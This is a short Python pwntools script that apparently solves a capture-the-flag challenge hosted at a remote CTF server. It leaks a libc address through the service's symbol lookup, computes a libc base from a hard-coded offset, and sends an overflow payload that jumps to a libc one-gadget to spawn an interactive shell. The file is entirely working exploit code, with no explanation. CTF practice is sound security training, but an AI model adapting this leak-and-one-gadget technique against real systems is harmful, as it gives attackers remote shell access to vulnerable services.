#!/usr/bin/env python3

from pwn import *

class ProbIO:
    def __init__(self, r):
        self.r = r
        self.sla = lambda t, x: self.r.sendlineafter(t, x)

    def comm(self, val):
        self.sla(">", val)

class Primitives:
    def __init__(self, io):
        self.io = io

    def funcAddr(self, sym): return self.io.comm(sym)
    def last(self, val): return self.io.comm(val)
    def libc(self, sym):
        self.io.comm(sym)
        self.io.r.recvuntil("is at ")
        libc = int(self.io.r.recvuntil("\n").decode()[:-2], 16) - 0x0000000000050d60
        return libc

def exploit(pri):
    one = [0x50a37, 0xebcf1, 0xebcf5, 0xebcf8]
    pri.funcAddr("system")
    libc = pri.libc("system")
    log.info(f"libc: {hex(libc)}")
    
    payload = b"AAAAAAAA"
    payload += p64(libc + one[3])
    pri.last(payload)
    pri.io.r.interactive()

def main(r):
    io = ProbIO(r)
    pri = Primitives(io)
    exploit(pri)

if __name__ == "__main__":
    r = remote("2outs.sstf.site", 1337)
    main(r)
